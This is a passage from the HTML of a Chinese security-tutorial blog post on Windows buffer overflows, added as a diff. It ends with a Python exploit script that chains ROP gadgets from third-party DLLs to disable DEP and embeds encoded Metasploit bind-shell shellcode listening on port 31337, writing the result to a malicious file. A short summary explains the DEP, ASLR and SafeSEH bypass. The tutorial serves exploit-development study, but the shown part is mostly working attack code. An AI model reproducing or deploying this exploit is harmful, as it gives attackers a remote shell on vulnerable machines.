+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x64065454</span>)  <span style="color:#75715e"># &amp;Writable location [MediaPlayerCtrl.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x60329371</span>)  <span style="color:#75715e"># POP EDI # RETN [Configuration.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6403e80e</span>)  <span style="color:#75715e"># RETN (ROP NOP) [MediaPlayerCtrl.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6162eaf0</span>)  <span style="color:#75715e"># POP EAX # RETN [EPG.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x90909090</span>)  <span style="color:#75715e"># nop</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6402abf8</span>)  <span style="color:#75715e"># PUSHAD # RETN [MediaPlayerCtrl.dll] </span>
+
+nop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
+
+<span style="color:#75715e"># windows/shell_bind_tcp - 368 bytes</span>
+<span style="color:#75715e"># http://www.metasploit.com</span>
+<span style="color:#75715e"># Encoder: x86/shikata_ga_nai</span>
+<span style="color:#75715e"># VERBOSE=false, LPORT=31337, RHOST=, EXITFUNC=process, </span>
+
+shellcode <span style="color:#f92672">=</span> (
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\xc1\xd9\x74\x24\xf4\xbb\xc4\xaa\x69\x8a\x58\x33\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\x83\xe8\xfc\x31\x58\x14\x03\x58\xd0\x48\x9c\x76\x30\x05</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5f\x87\xc0\x76\xe9\x62\xf1\xa4\x8d\xe7\xa3\x78\xc5\xaa\x4f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf2\x8b\x5e\xc4\x76\x04\x50\x6d\x3c\x72\x5f\x6e\xf0\xba\x33</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xac\x92\x46\x4e\xe0\x74\x76\x81\xf5\x75\xbf\xfc\xf5\x24\x68</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8a\xa7\xd8\x1d\xce\x7b\xd8\xf1\x44\xc3\xa2\x74\x9a\xb7\x18</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x76\xcb\x67\x16\x30\xf3\x0c\x70\xe1\x02\xc1\x62\xdd\x4d\x6e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x95\x4f\xa6\xa8\x56\x7e\x86\x67\x69\x4e\x0b\x79\xad\x69</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x0c\xc5\x89\x8e\x16\x1e\xf3\x54\x92\x83\x53\x1f\x04\x60</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\xcc\xd3\xe3\x69\xb9\x90\xac\x6d\x3c\x74\xc7\x8a\xb5\x7b</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x1b\x8d\x5f\x8c\x47\x56\xc1\x95\x2d\x39\xfe\xc6\x8a\xe6</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5a\x8c\x39\xf3\xdd\xcf\x55\x30\xd0\xef\xa5\x5e\x63\x83\x97</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xdf\x0b\x94\x8a\xf9\xcc\xdb\xa1\xbe\x43\x22\x49\xbf\x4a</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x1d\xef\xe4\xc0\x1d\x64\xf5\xed\xc8\x2b\xa5\x41\xa2\x8b</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x15\x22\x12\x64\x7c\xad\x4d\x94\x7f\x67\xf8\x92\xb1\x53\xa9</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x74\xb0\x63\x37\xec\x3d\x85\xad\xfe\x6b\x1d\x59\x3d\x48\x96</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x3e\xba\x8a\x57\xa9\xf2\xc4\x6f\xd6\x02\xc3\xdc\x7b\xaa</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x84\x96\x97\x6f\xb4\xa9\xbd\xc7\xbf\x92\x56\x9d\xd1\x51\xc6</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\xfb\x01\x6b\x30\x60\xd1\xe2\x29\x3f\x86\xa3\x9c\x36\x42</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5e\x86\xe0\x70\xa3\x5e\xca\x30\x78\xa3\xd5\xb9\x0d\x9f\xf1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa9\xcb\x20\xbe\x9d\x83\x76\x68\x4b\x62\x21\xda\x25\x3c\x9e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb4\xa1\xb9\xec\x06\xb7\xc5\x38\xf1\x57\x77\x95\x44\x68\xb8</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x41\x11\xa4\xe1\xae\xc8\x6c\x11\xe5\x50\xc4\xba\xa0\x01</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\xa7\x52\xfc\x9b\xde\xd0\xf4\x63\x25\xc8\x7d\x61\x61\x4e</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x1b\xfa\x3b\x90\x88\xfb\x69</span><span style="color:#e6db74">&#34;</span>)
+
+derp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> (totalsize <span style="color:#f92672">-</span> len(seh<span style="color:#f92672">+</span>rop<span style="color:#f92672">+</span>adv<span style="color:#f92672">+</span>nop<span style="color:#f92672">+</span>shellcode))
+payload <span style="color:#f92672">=</span> adv<span style="color:#f92672">+</span>seh<span style="color:#f92672">+</span>rop<span style="color:#f92672">+</span>nop<span style="color:#f92672">+</span>shellcode<span style="color:#f92672">+</span>derp
+
+f <span style="color:#f92672">=</span> open(file,<span style="color:#e6db74">&#39;w&#39;</span>)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Author: spasm - www.deadlisting.com&#34;</span>
+f<span style="color:#f92672">.</span>write(payload)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;File&#34;</span>,file, <span style="color:#e6db74">&#34;created...&#34;</span>
+f<span style="color:#f92672">.</span>close()
+
+</code></pre></div><h2 id="总结">总结</h2>
+<p>这就是通过<code>Return Oriented Programming（ROP)</code>来关闭<code>DEP</code>，并将控制转移给堆栈中的<code>shellcode</code>的方法。由于<code>ASLR</code>和<code>safeSEH</code>同时开启，因此需要利用第三方没有加入<code>ASLR</code>和<code>safeSEH</code>的<code>dll</code>中的指令序列来构造被调用函数的指针以及参数。而被调用的系统函数也需要通过静态的<code>IAT</code>表来间接获得函数指针。</p>
+
+                        </div>
+
+                        
+
+
+                        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/windows-buffer-overflow/">Windows Buffer Overflow</a></li>
+        
+        <li><a href="/post/buffer-overflow5/">Buffer Overflow(5)</a></li>
+        
+        <li><a href="/post/buffer-overflow4/">Buffer Overflow(4)</a></li>
+        
+        <li><a href="/post/buffer-overflow3/">Buffer Overflow(3)</a></li>
+        
+        <li><a href="/post/buffer-overflow2/">Buffer Overflow(2)</a></li>
+        
+    </ul>
+</div>
+
+
+                        <div class="post-meta meta-tags">
+                            
+                            没有标签
+                            
+                        </div>
+                    </article>
+                    
+    
+
+    
+    
+                </div>
+            </div>
+            <div id="secondary">
+    <section class="widget">
+        <form id="search" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://GETC2.github.io/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">订阅</h3>
+        <ul class="widget-list">
+            <li><a href="https://GETC2.github.io/index.xml">RSS</a></li>
+        </ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://GETC2.github.io/post/windows-buffer-overflow2/" title="Windows Buffer Overflow(2)">Windows Buffer Overflow(2)</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/windows-buffer-overflow/" title="Windows Buffer Overflow">Windows Buffer Overflow</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/buffer-overflow5/" title="Buffer Overflow(5)">Buffer Overflow(5)</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/buffer-overflow4/" title="Buffer Overflow(4)">Buffer Overflow(4)</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/buffer-overflow3/" title="Buffer Overflow(3)">Buffer Overflow(3)</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/buffer-overflow2/" title="Buffer Overflow(2)">Buffer Overflow(2)</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/buffer-overflow/" title="Buffer Overflow">Buffer Overflow</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/afl-fuzzing/" title="AFL Fuzzing">AFL Fuzzing</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/sulley-fuzzing/" title="Sulley Fuzzing">Sulley Fuzzing</a>
+    </li>
+    
+    <li>
+        <a href="https://GETC2.github.io/post/rdp-escape/" title="Escaping Restricted Desktops">Escaping Restricted Desktops</a>
+    </li>
+    
+</ul>
+
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-title">标签</h3>
+<div class="tagcloud">
+    
+</div>
+    </section>
+
+    
+
+    </div>
+
+        </div>
+    </div>
+</div>
+<footer id="footer">
+    <div class="container">
+        &copy; 2021 <a href="https://GETC2.github.io/">GET command and control</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
+        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/skydamon/maupassant-hugo" target="_blank">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+    <script type="text/javascript">
+    
+    (function(){
+        $("pre code").parent().addClass("line-numbers")
+    }())
+
+    window.MathJax = {
+        tex2jax: {
+            inlineMath: [ ['$','$'] ],
+            processEscapes: true
+        }
+    };
+    </script>
+    <script type="text/javascript" src="/js/prism.js" async="true"></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src="/js/totop.js?v=0.0.0" async=""></script>
+
+
+
+
+
+
+
+</body>
+</html>
